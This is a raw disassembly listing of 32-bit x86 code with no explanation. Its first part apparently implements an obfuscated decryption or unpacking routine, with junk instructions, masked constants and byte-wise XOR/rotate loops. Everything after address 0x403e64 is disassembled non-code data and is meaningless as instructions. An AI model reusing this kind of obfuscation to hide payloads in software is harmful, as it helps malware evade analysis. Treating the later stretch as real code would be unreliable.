  4039be:	cmp    edx,0x244ecb82
  4039c4:	jbe    0x4039e9
  4039ca:	xor    DWORD PTR ds:0x428ea3,0x47b3
  4039d4:	add    DWORD PTR [ecx],0x405fcc1
  4039da:	mov    DWORD PTR ds:0x428e63,0x27c8
  4039e4:	jmp    0x4039f9
  4039e9:	or     DWORD PTR ds:0x428ea3,0x2c0c
  4039f3:	add    DWORD PTR [ecx],0xfdaf433f
  4039f9:	mov    ecx,DWORD PTR [ebp-0x18]
  4039fc:	and    DWORD PTR ds:0x428e27,0x4d72
  403a06:	xor    ecx,esi
  403a08:	xor    DWORD PTR ds:0x428ea3,0x741f
  403a12:	inc    eax
  403a13:	sub    DWORD PTR ds:0x428e37,0x428eb7
  403a1d:	inc    DWORD PTR [ebp-0x14]
  403a20:	add    ecx,edi
  403a22:	mov    DWORD PTR ds:0x428e47,0x2f68
  403a2c:	cmp    eax,ecx
  403a2e:	jb     0x40393c
  403a34:	and    DWORD PTR ds:0x428e9b,0x0
  403a3e:	mov    eax,ds:0x428e9b
  403a43:	inc    eax
  403a44:	mov    ds:0x428e9b,eax
  403a49:	cmp    DWORD PTR ds:0x428e9b,0xd
  403a50:	jb     0x403a8c
  403a56:	jmp    0x403a67
  403a5b:	push   DWORD PTR [ebp-0x18]
  403a5e:	push   DWORD PTR [ebp-0x1c]
  403a61:	call   DWORD PTR ds:0x42a9e3
  403a67:	cmp    DWORD PTR ds:0x428e9b,0xc
  403a6e:	jne    0x403a7f
  403a74:	mov    eax,ds:0x428e9b
  403a79:	inc    eax
  403a7a:	mov    ds:0x428e9b,eax
  403a7f:	cmp    DWORD PTR ds:0x428e9b,0x15
  403a86:	jb     0x403a3e
  403a8c:	mov    dl,BYTE PTR [ebp-0x21]
  403a8f:	xor    eax,0x61a1
  403a94:	mov    eax,DWORD PTR [ebp-0x34]
  403a97:	xor    al,0xaf
  403a99:	mov    cl,0xa
  403a9b:	sub    cl,al
  403a9d:	add    DWORD PTR ds:0x428ea3,0x32c3
  403aa7:	add    dl,cl
  403aa9:	sbb    ecx,DWORD PTR ds:0x428eb3
  403aaf:	mov    ecx,DWORD PTR [ebp-0x1c]
  403ab2:	sub    DWORD PTR ds:0x428ea7,0x428e8f
  403abc:	xor    cl,0xaf
  403abf:	sub    cl,0xa
  403ac2:	sub    DWORD PTR ds:0x428ea3,0x68fd
  403acc:	ror    dl,cl
  403ace:	sub    DWORD PTR ds:0x428e6b,ebx
  403ad4:	xor    eax,eax
  403ad6:	mov    eax,DWORD PTR [ebp-0xc]
  403ad9:	add    DWORD PTR ds:0x428e8f,ebx
  403adf:	mov    BYTE PTR [eax+ebx*1+0x800],dl
  403ae6:	mov    ecx,DWORD PTR ds:0x4292eb
  403aec:	mov    eax,ds:0x429777
  403af1:	sub    ecx,eax
  403af3:	and    ecx,DWORD PTR [ecx+eax*1]
  403af6:	mov    eax,DWORD PTR [ebp-0xc]
  403af9:	mov    DWORD PTR ds:0x428e33,0x15
  403b03:	cmp    DWORD PTR ds:0x428e33,0x0
  403b0a:	je     0x403b3f
  403b10:	cmp    DWORD PTR ds:0x428e33,0x25
  403b17:	jbe    0x403b3f
  403b1d:	jmp    0x403b2d
  403b22:	push   0x428e23
  403b27:	call   DWORD PTR ds:0x42a9e7
  403b2d:	mov    ecx,DWORD PTR ds:0x428e33
  403b33:	dec    ecx
  403b34:	mov    DWORD PTR ds:0x428e33,ecx
  403b3a:	jmp    0x403b03
  403b3f:	mov    ecx,DWORD PTR [ebp-0x28]
  403b42:	neg    DWORD PTR ds:0x428e5b
  403b48:	sub    eax,edi
  403b4a:	sub    DWORD PTR ds:0x428e8b,0x4b02
  403b54:	xor    eax,esi
  403b56:	mov    DWORD PTR ds:0x428ec7,0x6067
  403b60:	cmp    eax,ecx
  403b62:	jne    0x403b8c
  403b68:	mov    eax,DWORD PTR [ebp-0x8]
  403b6b:	mov    ecx,DWORD PTR [ebp-0x10]
  403b6e:	xor    eax,esi
  403b70:	xor    ecx,esi
  403b72:	sub    eax,ecx
  403b74:	sub    eax,edi
  403b76:	xor    eax,esi
  403b78:	mov    DWORD PTR [ebp-0x8],eax
  403b7b:	mov    eax,DWORD PTR [ebp-0x10]
  403b7e:	xor    eax,esi
  403b80:	mov    ecx,0xffcd8d8a
  403b85:	sub    ecx,eax
  403b87:	jmp    0x403b9b
  403b8c:	mov    eax,DWORD PTR [ebp-0x10]
  403b8f:	xor    eax,esi
  403b91:	mov    ecx,0xffcd8d0a
  403b96:	sub    ecx,eax
  403b98:	add    ecx,DWORD PTR [ebp-0xc]
  403b9b:	mov    DWORD PTR [ebp-0xc],ecx
  403b9e:	mov    eax,DWORD PTR [ebp-0x8]
  403ba1:	cmp    eax,0xf89c85a5
  403ba6:	jne    0x403815
  403bac:	mov    DWORD PTR [ebp-0x34],0x9
  403bb3:	mov    ecx,DWORD PTR [ebp+0x8]
  403bb6:	xor    ecx,esi
  403bb8:	add    ecx,edi
  403bba:	jmp    0x403e1a
  403bbf:	lea    eax,[ecx+ebx*1]
  403bc2:	mov    DWORD PTR [ebp-0x2c],eax
  403bc5:	mov    eax,DWORD PTR [ebp-0x58]
  403bc8:	sub    eax,ecx
  403bca:	mov    DWORD PTR [ebp-0x1c],eax
  403bcd:	mov    eax,DWORD PTR [ebp-0x1c]
  403bd0:	mov    DWORD PTR [ebp-0x14],eax
  403bd3:	mov    eax,DWORD PTR [ebp-0x2c]
  403bd6:	mov    DWORD PTR [ebp-0x38],0xf89c85a5
  403bdd:	mov    DWORD PTR [ebp-0x54],eax
  403be0:	mov    DWORD PTR [ebp-0x20],0xf89c85a4
  403be7:	mov    eax,DWORD PTR [ebp-0x38]
  403bea:	xor    eax,esi
  403bec:	add    eax,edi
  403bee:	mov    DWORD PTR [ebp-0x10],eax
  403bf1:	mov    eax,DWORD PTR [ebp-0x38]
  403bf4:	xor    eax,esi
  403bf6:	add    eax,edi
  403bf8:	mov    DWORD PTR [ebp-0x8],eax
  403bfb:	mov    DWORD PTR [ebp-0x2c],0xf89c8585
  403c02:	mov    DWORD PTR [ebp-0x44],0xf89c85be
  403c09:	mov    eax,DWORD PTR [ebp-0x38]
  403c0c:	mov    edx,DWORD PTR [ebp-0x14]
  403c0f:	xor    eax,esi
  403c11:	add    eax,edi
  403c13:	cmp    edx,eax
  403c15:	je     0x403e0e
  403c1b:	mov    eax,DWORD PTR [ebp-0x20]
  403c1e:	xor    eax,esi
  403c20:	mov    edx,0xffcd8d0a
  403c25:	sub    edx,eax
  403c27:	add    edx,DWORD PTR [ebp-0x14]
  403c2a:	mov    eax,DWORD PTR [ebp-0x20]
  403c2d:	mov    ebx,DWORD PTR [ebp-0x10]
  403c30:	xor    eax,esi
  403c32:	add    eax,edi
  403c34:	imul   eax,ebx
  403c37:	cmp    eax,edx
  403c39:	ja     0x403e0b
  403c3f:	mov    edx,DWORD PTR [ebp-0x10]
  403c42:	mov    eax,DWORD PTR [ebp-0x14]
  403c45:	mov    ebx,DWORD PTR [ebp-0x2c]
  403c48:	sub    eax,edx
  403c4a:	xor    ebx,esi
  403c4c:	xor    edx,edx
  403c4e:	add    ebx,edi
  403c50:	div    ebx
  403c52:	mov    DWORD PTR [ebp-0x8],eax
  403c55:	mov    eax,DWORD PTR [ebp-0x44]
  403c58:	mov    edx,DWORD PTR [ebp-0x8]
  403c5b:	xor    eax,esi
  403c5d:	add    eax,edi
  403c5f:	cmp    edx,eax
  403c61:	jbe    0x403c71
  403c67:	mov    eax,DWORD PTR [ebp-0x44]
  403c6a:	xor    eax,esi
  403c6c:	add    eax,edi
  403c6e:	mov    DWORD PTR [ebp-0x8],eax
  403c71:	mov    eax,DWORD PTR [ebp-0x2c]
  403c74:	mov    edx,DWORD PTR [ebp-0x8]
  403c77:	xor    eax,esi
  403c79:	add    eax,edi
  403c7b:	imul   eax,edx
  403c7e:	mov    DWORD PTR [ebp-0x8],eax
  403c81:	mov    eax,DWORD PTR [ebp-0x38]
  403c84:	mov    edx,DWORD PTR [ebp-0x8]
  403c87:	xor    eax,esi
  403c89:	add    eax,edi
  403c8b:	cmp    edx,eax
  403c8d:	je     0x403df4
  403c93:	mov    eax,DWORD PTR [ebp-0x8]
  403c96:	mov    DWORD PTR [ebp-0x18],eax
  403c99:	mov    eax,DWORD PTR [ebp-0x10]
  403c9c:	add    eax,DWORD PTR [ebp-0x54]
  403c9f:	mov    DWORD PTR [ebp-0x1c],0xf89c85a5
  403ca6:	mov    DWORD PTR [ebp-0x8],eax
  403ca9:	mov    eax,0xf89c85a4
  403cae:	mov    DWORD PTR [ebp-0x28],eax
  403cb1:	mov    DWORD PTR [ebp-0x5c],0xf89c85a3
  403cb8:	mov    DWORD PTR [ebp-0x40],0xf89c85a2
  403cbf:	mov    DWORD PTR [ebp-0x30],eax
  403cc2:	mov    eax,DWORD PTR [ebp-0x1c]
  403cc5:	xor    eax,esi
  403cc7:	add    eax,edi
  403cc9:	jmp    0x403db0
  403cce:	mov    DWORD PTR [ebp-0x4c],0xf89c85ba
  403cd5:	mov    DWORD PTR [ebp-0x50],0xf89c858f
  403cdc:	mov    eax,DWORD PTR [ebp-0x30]
  403cdf:	mov    edx,DWORD PTR [ebp-0xc]
  403ce2:	xor    eax,esi
  403ce4:	add    eax,edi
  403ce6:	imul   eax,edx
  403ce9:	mov    edx,DWORD PTR [ebp-0x8]
  403cec:	mov    al,BYTE PTR [eax+edx*1]
  403cef:	mov    BYTE PTR [ebp-0x1],al
  403cf2:	mov    eax,DWORD PTR [ebp-0x30]
  403cf5:	mov    edx,DWORD PTR [ebp-0xc]
  403cf8:	xor    eax,esi
  403cfa:	add    eax,edi
  403cfc:	imul   eax,edx
  403cff:	mov    edx,DWORD PTR [ebp-0x5c]
  403d02:	xor    edx,esi
  403d04:	add    eax,edx
  403d06:	mov    edx,DWORD PTR [ebp-0x8]
  403d09:	movzx  eax,BYTE PTR [eax+edx*1+0x3272f6]
  403d11:	mov    edx,DWORD PTR [ebp-0x4c]
  403d14:	xor    edx,esi
  403d16:	lea    eax,[edx+eax*1+0x3272f6]
  403d1d:	movzx  edx,BYTE PTR [ebp-0x1]
  403d21:	xor    edx,eax
  403d23:	mov    BYTE PTR [ebp-0x1],dl
  403d26:	mov    al,BYTE PTR [ebp-0x1]
  403d29:	mov    edx,DWORD PTR [ebp-0x30]
  403d2c:	mov    ebx,DWORD PTR [ebp-0xc]
  403d2f:	xor    edx,esi
  403d31:	add    edx,edi
  403d33:	imul   edx,ebx
  403d36:	mov    ebx,DWORD PTR [ebp-0x8]
  403d39:	mov    BYTE PTR [edx+ebx*1],al
  403d3c:	mov    eax,DWORD PTR [ebp-0x30]
  403d3f:	mov    edx,DWORD PTR [ebp-0xc]
  403d42:	xor    eax,esi
  403d44:	add    eax,edi
  403d46:	imul   eax,edx
  403d49:	mov    edx,DWORD PTR [ebp-0x8]
  403d4c:	mov    al,BYTE PTR [eax+edx*1]
  403d4f:	mov    BYTE PTR [ebp-0x1],al
  403d52:	mov    eax,DWORD PTR [ebp-0x30]
  403d55:	mov    edx,DWORD PTR [ebp-0xc]
  403d58:	xor    eax,esi
  403d5a:	add    eax,edi
  403d5c:	imul   eax,edx
  403d5f:	mov    edx,DWORD PTR [ebp-0x28]
  403d62:	xor    edx,esi
  403d64:	add    eax,edx
  403d66:	mov    edx,DWORD PTR [ebp-0x8]
  403d69:	movzx  eax,BYTE PTR [eax+edx*1+0x3272f6]
  403d71:	mov    edx,DWORD PTR [ebp-0x50]
  403d74:	xor    edx,esi
  403d76:	lea    eax,[edx+eax*1+0x3272f6]
  403d7d:	movzx  edx,BYTE PTR [ebp-0x1]
  403d81:	xor    edx,eax
  403d83:	mov    BYTE PTR [ebp-0x1],dl
  403d86:	mov    al,BYTE PTR [ebp-0x1]
  403d89:	mov    edx,DWORD PTR [ebp-0x30]
  403d8c:	mov    ebx,DWORD PTR [ebp-0xc]
  403d8f:	xor    edx,esi
  403d91:	add    edx,edi
  403d93:	imul   edx,ebx
  403d96:	mov    ebx,DWORD PTR [ebp-0x8]
  403d99:	mov    BYTE PTR [edx+ebx*1],al
  403d9c:	mov    eax,DWORD PTR [ebp-0x40]
  403d9f:	mov    edx,DWORD PTR [ebp-0x28]
  403da2:	xor    eax,esi
  403da4:	xor    edx,esi
  403da6:	add    eax,edi
  403da8:	add    edx,edi
  403daa:	imul   eax,edx
  403dad:	add    eax,DWORD PTR [ebp-0xc]
  403db0:	mov    DWORD PTR [ebp-0xc],eax
  403db3:	mov    eax,DWORD PTR [ebp-0xc]
  403db6:	mov    edx,DWORD PTR [ebp-0x18]
  403db9:	cmp    edx,eax
  403dbb:	jb     0x403cce
  403dc1:	mov    eax,DWORD PTR [ebp-0x28]
  403dc4:	mov    edx,DWORD PTR [ebp-0x18]
  403dc7:	xor    eax,esi
  403dc9:	add    eax,edi
  403dcb:	imul   eax,edx
  403dce:	mov    edx,DWORD PTR [ebp-0x1c]
  403dd1:	xor    edx,esi
  403dd3:	add    edx,edi
  403dd5:	or     eax,edx
  403dd7:	mov    edx,DWORD PTR [ebp-0x20]
  403dda:	xor    edx,esi
  403ddc:	add    eax,edx
  403dde:	mov    edx,DWORD PTR [ebp-0x20]
  403de1:	xor    edx,esi
  403de3:	add    eax,edx
  403de5:	mov    edx,DWORD PTR [ebp-0x10]
  403de8:	lea    eax,[eax+edx*1+0x64e5ec]
  403def:	jmp    0x403e03
  403df4:	mov    eax,DWORD PTR [ebp-0x20]
  403df7:	mov    edx,DWORD PTR [ebp-0x10]
  403dfa:	xor    eax,esi
  403dfc:	lea    eax,[eax+edx*1+0x3272f6]
  403e03:	mov    DWORD PTR [ebp-0x10],eax
  403e06:	jmp    0x403c1b
  403e0b:	mov    ebx,DWORD PTR [ebp-0x3c]
  403e0e:	mov    eax,DWORD PTR [ebp+0xc]
  403e11:	xor    eax,esi
  403e13:	lea    ecx,[ecx+eax*1+0x3272f6]
  403e1a:	lea    eax,[ecx-0x3272f6]
  403e20:	xor    eax,esi
  403e22:	cmp    eax,0xf89c95a5
  403e27:	jne    0x403bbf
  403e2d:	dec    DWORD PTR [ebp-0x34]
  403e30:	jne    0x403bb3
  403e36:	mov    eax,DWORD PTR [ebp+0x8]
  403e39:	mov    ecx,DWORD PTR [ebp+0xc]
  403e3c:	mov    edx,DWORD PTR [ebp+0x8]
  403e3f:	xor    ecx,esi
  403e41:	mov    cl,BYTE PTR [ecx+ebx*1+0x3272f6]
  403e48:	xor    eax,esi
  403e4a:	mov    al,BYTE PTR [eax+ebx*1+0x3272f6]
  403e51:	xor    edx,esi
  403e53:	mov    BYTE PTR [edx+ebx*1+0x3272f6],cl
  403e5a:	mov    ecx,DWORD PTR [ebp+0xc]
  403e5d:	xor    ecx,esi
  403e5f:	jmp    0x4061b8
  403e64:	outs   dx,BYTE PTR ds:[esi]
  403e65:	pop    edi
  403e66:	or     al,BYTE PTR [bp+0xa]
  403e6a:	push   cs
  403e6b:	pop    ss
  403e6c:	xor    edx,esi
  403e6e:	cld    
  403e6f:	fwait
  403e70:	(bad)  
  403e71:	xor    dl,bl
  403e73:	jl     0x403ebc
  403e75:	pusha  
  403e76:	add    DWORD PTR [ebx-0x7c7c9fb9],0x31
  403e7d:	xchg   edx,eax
  403e7e:	pop    ds
  403e7f:	cld    
  403e80:	cs sbb al,0x9f
  403e83:	leave  
  403e84:	push   0xce8fe191
  403e89:	aad    0xee
  403e8b:	cwde   
  403e8c:	fcom   st(7)
  403e8e:	es adc al,0x8
  403e91:	mov    ebx,0xff6d7440
  403e96:	add    al,BYTE PTR [ebp+0x2c]
  403e99:	(bad)  
  403e9a:	nop
  403e9b:	and    al,0x28
  403e9d:	mov    WORD PTR [ecx-0x130a2a49],ss
  403ea3:	cdq    
  403ea4:	nop
  403ea5:	xor    eax,ebx
  403ea7:	leave  
  403ea8:	sub    DWORD PTR ds:0xd3f456d7,ecx
  403eae:	rol    BYTE PTR [esi-0x24],1
  403eb1:	popf   
  403eb2:	fcom   st(7)
  403eb4:	jno    0x403ecf
  403eb6:	dec    eax
  403eb7:	bound  eax,QWORD PTR [eax-0x64]
  403eba:	and    dh,ah
  403ebc:	add    eax,0x967b2f14
  403ec1:	ja     0x403ee1
  403ec3:	mov    edx,0xb533bbff
  403ec8:	pop    esi
  403ec9:	daa    
  403eca:	mov    DWORD PTR [ebp-0x6d],ecx
  403ecd:	inc    ebx
  403ece:	fs mov bp,0x4269
  403ed3:	sub    eax,0xdfafcd54
  403ed8:	or     cl,BYTE PTR [ebx-0xed2ed38]
  403ede:	mov    esi,0x2d34efac
  403ee3:	mov    ds:0xdb331848,eax
  403ee8:	jmp    0x9cbef649
  403eed:	mov    ecx,0x4c22feac
  403ef2:	pushf  
  403ef3:	sbb    al,0xe3
  403ef5:	pop    ecx
  403ef6:	out    dx,al
  403ef7:	and    eax,DWORD PTR [esi]
  403ef9:	push   ebp
  403efa:	rol    DWORD PTR [edi-0x62],1
  403efd:	mov    al,0xfd
  403eff:	loopne 0x403f1b
  403f01:	loope  0x403efe
  403f03:	stos   DWORD PTR es:[edi],eax
  403f04:	rcr    BYTE PTR ds:0x651626f9,cl
  403f0a:	fwait
  403f0b:	pop    ebx
  403f0c:	les    eax,FWORD PTR [eax]
  403f0e:	pusha  
  403f0f:	dec    edi
  403f10:	aas    
  403f11:	mov    edx,0xef39b336
  403f16:	sbb    ecx,eax
  403f18:	adc    al,0xa8
  403f1a:	and    ebp,ebx
  403f1c:	dec    eax
  403f1d:	shl    DWORD PTR [ecx+0x40],cl
  403f20:	test   eax,0x41cca3d8
  403f25:	jne    0x403f74
  403f27:	enter  0x4ce7,0xc9
  403f2b:	xchg   ebx,eax
  403f2c:	mov    dh,0x49
  403f2e:	jns    0x403f34
  403f30:	mov    ah,0x21
  403f32:	push   esi
  403f33:	add    al,0x38
  403f35:	adc    ebp,DWORD PTR [ebx-0x80]
  403f38:	or     BYTE PTR [eax+0x15],0x93
  403f3c:	imul   ebp,DWORD PTR [ecx+ecx*8],0x20
  403f40:	fwait
  403f41:	mov    ebx,0x8aa8edf8
  403f46:	fisubr WORD PTR [edi+0x78092fd8]
  403f4c:	lea    esp,[esi-0x3099b127]
  403f52:	mov    ds:0xa42a2ba2,al
  403f57:	adc    BYTE PTR [edi],bh
  403f59:	xor    dh,BYTE PTR [ecx+ebp*2-0xd]
  403f5d:	aad    0xde
  403f5f:	test   eax,0x1a81e8f4
  403f64:	jb     0x403ee8
  403f66:	jnp    0x403eec
  403f68:	sbb    DWORD PTR [esi],ecx
  403f6a:	loope  0x403fb0
  403f6c:	in     al,dx
  403f6d:	mov    BYTE PTR [ecx+0x47],ah
  403f70:	pushf  
  403f71:	inc    edi
  403f72:	or     al,0xea
  403f74:	adc    al,0x46
  403f76:	retf   0xce96
  403f79:	add    cl,BYTE PTR [eax+0x5f]
  403f7c:	jg     0x403fc9
  403f7e:	xchg   edi,eax
  403f7f:	scas   eax,DWORD PTR es:[edi]
  403f80:	daa    
  403f81:	bound  eax,QWORD PTR [edi]
  403f83:	xchg   ebx,eax
  403f84:	fld    DWORD PTR [ecx-0x2dc449d7]
  403f8a:	into   
  403f8b:	xchg   edi,eax
  403f8d:	pop    es
  403f8e:	lods   eax,DWORD PTR ds:[esi]
  403f8f:	test   al,0xb6
  403f91:	aad    0x1
  403f93:	mov    bh,0xf1
  403f95:	outs   dx,DWORD PTR ds:[esi]
  403f96:	fst    QWORD PTR [eax]
  403f98:	fistp  DWORD PTR [ebx-0x77]
  403f9b:	adc    DWORD PTR [edi-0x2a4ea52b],0x51
  403fa2:	sub    al,dl
  403fa4:	xchg   esi,eax
  403fa5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403fa6:	xor    BYTE PTR [esi-0x18d5e34e],ah
  403fac:	neg    DWORD PTR [edx+0x5a]
  403faf:	ret    
  403fb0:	shl    BYTE PTR [ebx+esi*8+0x6732eff9],1
  403fb7:	pop    ss
  403fb8:	stc    
  403fb9:	lahf   
  403fba:	imul   edx,DWORD PTR [ebp-0x5],0x3f7cd9a2
  403fc1:	xor    eax,0x165729c7
  403fc6:	(bad)  
  403fc7:	cld    
  403fc8:	dec    esi
  403fc9:	sub    eax,0x84db2e70
  403fce:	cdq    
  403fcf:	or     DWORD PTR [ecx],ebp
  403fd1:	pop    ds
  403fd2:	pop    esi
  403fd3:	adc    al,0x68
  403fd5:	mov    edx,0x500ab776
  403fda:	jge    0x403fed
  403fdc:	test   al,0x8
  403fde:	inc    edi
  403fdf:	sbb    BYTE PTR [edx-0x80],dl
  403fe2:	sub    al,0x89
  403fe4:	or     DWORD PTR [ebx-0x62f9e8ea],eax
  403fea:	rol    DWORD PTR cs:[eax+0x47e6a94d],0x83
  403ff2:	jp     0x404018
  403ff4:	out    dx,al
  403ff5:	call   0x28d8001f
  403ffa:	inc    esp
  403ffb:	xchg   BYTE PTR [ebx],cl
  403ffd:	dec    edi
  403ffe:	mov    ds:0x46899660,al
  404003:	in     al,dx
  404004:	retf   
  404005:	jl     0x403fde
  404007:	pop    esi
  404008:	test   WORD PTR [edi-0x67],si
  40400c:	rcl    DWORD PTR [ebp-0x1cc06ecf],cl
  404012:	sar    DWORD PTR es:[eax-0x12],cl
  404016:	scas   eax,DWORD PTR es:[edi]
  404017:	dec    esp
  404018:	ret    0x10a7
  40401b:	dec    ebx
  40401c:	je     0x404066
  40401e:	shr    DWORD PTR [esi+0x33c4fe52],0xf9
  404025:	fucomp st(1)
  404027:	(bad)  
  404028:	arpl   WORD PTR [ebp-0x35],sp
  40402b:	rol    DWORD PTR [esi+0x3d],0x37
  40402f:	jl     0x403fed
  404031:	xchg   edi,eax
  404032:	clc    
  404033:	hlt    
  404034:	dec    DWORD PTR [edx+0x73]
  404037:	add    al,0x5d
  404039:	xchg   BYTE PTR [ebx],ah
  40403b:	mov    ds:0x8049a03,eax
  404040:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404041:	into   
  404042:	fucomi st,st(5)
  404044:	xchg   ecx,eax
  404045:	and    eax,0x729fcad9
  40404a:	rol    DWORD PTR [ecx+ebp*8],0x5c
  40404e:	test   al,0xf2
  404050:	sub    eax,0x723f4608
  404055:	arpl   WORD PTR [ebx],si
  404057:	imul   DWORD PTR [ecx]
  404059:	inc    esi
  40405a:	pop    eax
  40405b:	mov    BYTE PTR [ebx-0x6b4e9295],dh
  404061:	fcom   QWORD PTR [esi]
  404063:	xor    BYTE PTR [ebx],ch
  404065:	icebp  
  404066:	cli    
  404067:	and    dh,al
  404069:	xor    al,BYTE PTR [eax+0x70a0fee0]
  40406f:	push   0xfd0c4a98
  404074:	mov    edi,0x17b5bcff
  404079:	cmp    DWORD PTR [edx+0x6d],ecx
  40407c:	out    dx,al
  40407d:	and    al,0xb8
  40407f:	adc    ch,bl
  404081:	push   ecx
  404082:	(bad)  
  404083:	fisubr DWORD PTR [eax-0x31]
  404086:	pop    ebx
  404087:	loop   0x4040f5
  404089:	les    edx,FWORD PTR [esi+ebx*2]
  40408c:	fsub   st(2),st
  40408e:	popf   
  40408f:	pop    es
  404090:	jle    0x404101
  404092:	sub    al,BYTE PTR [ecx-0x4cae3b48]
  404098:	dec    edx
  404099:	push   eax
  40409a:	and    DWORD PTR [ecx-0x15b5a55d],edi
  4040a0:	jae    0x4040e0
  4040a2:	aaa    
  4040a3:	scas   al,BYTE PTR es:[edi]
  4040a4:	lods   eax,DWORD PTR ds:[esi]
  4040a5:	jmp    0x404035
  4040a7:	inc    eax
  4040a8:	(bad)
  4040ab:	xor    eax,0xf44ddbaa
  4040b0:	sahf   
  4040b1:	hlt    
  4040b2:	pop    esp
  4040b3:	cld    
  4040b4:	pop    eax
  4040b5:	and    dl,BYTE PTR ds:0xa0a5119f
  4040bb:	jecxz  0x4040ac
  4040bd:	mov    dl,0x2
  4040bf:	mov    edx,0x6a172a78
  4040c4:	jp     0x4040aa
  4040c6:	inc    esi
  4040c7:	inc    esi
  4040c8:	xchg   edx,eax
  4040c9:	imul   esp,DWORD PTR es:[eax],0x8b955f2a
  4040d0:	cmp    BYTE PTR ds:0xd879e13d,ah
  4040d6:	jl     0x4040c5
  4040d8:	fmul   QWORD PTR [edx-0x44fdc4ed]
  4040de:	pop    ebp
  4040df:	mov    bh,0x64
  4040e1:	push   ecx
  4040e2:	pop    eax
  4040e3:	dec    edi
  4040e4:	loope  0x4040ba
  4040e6:	lock pop ss
  4040e8:	inc    edi
  4040e9:	jne    0x4040bb
  4040eb:	fstp   QWORD PTR [ebx-0x64]
  4040ee:	mov    ecx,0x4901dad6
  4040f3:	retf   0x729
  4040f6:	add    eax,0xa1a95e0b
  4040fb:	call   0x76c:0x3f03c850
  404102:	add    ebx,DWORD PTR [eax+0x42]
  404105:	loopne 0x40414c
  404107:	dec    edi
  404108:	scas   eax,DWORD PTR es:[edi]
  404109:	rol    BYTE PTR [ebx],1
  40410b:	push   0xffffff80
  40410d:	pop    ebx
  40410e:	mov    esi,0xfddf962f
  404113:	mov    edx,0x6eea079e
  404118:	cmp    DWORD PTR [esi-0x3bacee99],0x8
  40411f:	push   cs
  404120:	not    DWORD PTR [eax+eiz*2+0x24]
  404124:	fstp   QWORD PTR [edi]
  404126:	je     0x404184
  404128:	jge    0x404130
  40412a:	les    edi,FWORD PTR [edi]
  40412c:	jne    0x404122
  40412e:	out    dx,eax
  40412f:	inc    esi
  404130:	ja     0x4040b2
  404132:	inc    ebx
  404133:	popa   
  404134:	cli    
  404135:	add    al,0x8c
  404137:	ret    0xd01a
  40413a:	sbb    BYTE PTR [ebp+0x7849585f],ah
  404140:	push   ecx
  404141:	hlt    
  404142:	cmp    BYTE PTR [edx+0x4583cf74],al
  404148:	mov    ebp,DWORD PTR [ebx]
  40414a:	ficom  DWORD PTR [ebx]
  40414c:	inc    edi
  40414d:	neg    cl
  40414f:	data16 ja 0x4040f0
  404152:	(bad)  
  404153:	int3   
  404154:	adc    eax,0x9cdf9a80
  404159:	or     ah,bl
  40415b:	fsubr  st(0),st
  40415d:	jg     0x4041b8
  40415f:	ret    
  404160:	adc    BYTE PTR [ecx],bh
  404162:	in     eax,0x49
  404164:	sbb    BYTE PTR [eax+0x45039646],ah
  40416a:	fwait
  40416b:	test   eax,0xe53bafa1
  404170:	gs pop ebp
  404172:	push   ds
  404173:	mov    ds:0x41f994dd,eax
  404178:	sub    eax,0x7f2e249e
  40417d:	fsubr  QWORD PTR [ebx-0x496859e4]
  404183:	push   cs
  404184:	push   ebx
  404185:	retf   
  404186:	dec    eax
  404187:	repz fucomi st,st(5)
  40418a:	(bad)  
  40418c:	mov    es,WORD PTR [eax]
  40418e:	lea    esp,[edi+0x0]
  404191:	imul   edx,DWORD PTR [edi+0x59],0x70
  404195:	mov    DWORD PTR [esi+0x6f],edi
  404198:	pop    ds
  404199:	and    eax,0x50bcc1f5
  40419e:	push   ds
  40419f:	sub    dh,dl
  4041a1:	mov    ebp,0x94fe03d2
  4041a6:	mov    ebp,0xf48c7f72
  4041ab:	push   edi
  4041ac:	mov    edx,DWORD PTR [ebp-0x6d]
  4041af:	and    bl,BYTE PTR [edi+0x3ae24fe9]
  4041b5:	pop    eax
  4041b6:	call   0x3eef:0x39bdc4e
  4041bd:	pop    ds
  4041be:	rcl    edx,cl
  4041c0:	popa   
  4041c1:	dec    ebx
  4041c2:	mov    dl,0xe9
  4041c4:	jno    0x4041b5
  4041c6:	pop    eax
  4041c7:	pmulhw mm1,QWORD PTR [edx-0x447c6949]
  4041ce:	daa    
  4041cf:	pop    ebx
  4041d0:	xchg   ebx,eax
  4041d1:	lds    esi,FWORD PTR [ecx+0x11]
  4041d4:	push   ss
  4041d5:	sub    BYTE PTR [edx+ebx*8-0xfc8bf19],ch
  4041dc:	adc    dh,al
  4041de:	xchg   ebp,eax
  4041df:	jp     0x4041db
  4041e1:	xor    esp,DWORD PTR [ecx+ebp*2]
  4041e4:	cld    
  4041e5:	(bad)  
  4041e6:	fs repz mov edi,0xbbfbe0c8
  4041ed:	icebp  
  4041ee:	jo     0x404188
  4041f0:	dec    esp
  4041f1:	data16 jp 0x4041ce
  4041f4:	rcl    BYTE PTR [esi-0x52],1
  4041f7:	dec    eax
  4041f8:	out    0x51,al
  4041fa:	retf   0xaf64
  4041fd:	xchg   esi,eax
  4041fe:	add    ecx,DWORD PTR [edx]
  404200:	and    al,0x98
  404202:	adc    al,0x87
  404204:	idiv   ah
  404206:	cmp    ebp,DWORD PTR [ecx+0x32]
  404209:	cmp    al,0xe3
  40420b:	push   ebx
  40420c:	cdq    
  40420d:	jb     0x4041c6
  40420f:	sub    bh,BYTE PTR [esi-0xf]
  404212:	(bad)  
  404213:	jmp    0x4041f1
  404215:	dec    ebp
  404216:	mov    dl,0xf0
  404218:	test   DWORD PTR [esi+0x24bf086f],edi
  40421e:	jbe    0x404207
  404220:	aaa    
  404221:	js     0x4041e4
  404223:	aaa    
  404224:	test   eax,0x11db93ef
  404229:	sub    eax,0xf2d40713
  40422f:	xchg   esp,eax
  404230:	fmul   DWORD PTR [eax-0x4]
  404233:	xchg   esp,eax
  404234:	nop
  404235:	and    bl,BYTE PTR [eax+0x5a21cc1c]
  40423b:	(bad)  
  40423c:	fiadd  DWORD PTR [eax]
  40423e:	xchg   ebx,eax
  40423f:	adc    eax,0x5a1bea39
  404244:	sbb    dh,BYTE PTR [esi-0x45]
  404247:	xor    bh,ah
  404249:	imul   ebp,DWORD PTR [edx+eiz*8-0x7bfc6680],0xd1369cee
  404254:	mov    bh,dh
  404256:	fsub   QWORD PTR [ebp+0x5]
  404259:	inc    edx
  40425a:	das    
  40425b:	cmp    esi,DWORD PTR [edi-0x1ed0b446]
  404261:	call   0xeeda:0xece1cf7b
  404268:	or     DWORD PTR [esp+edx*1],ebx
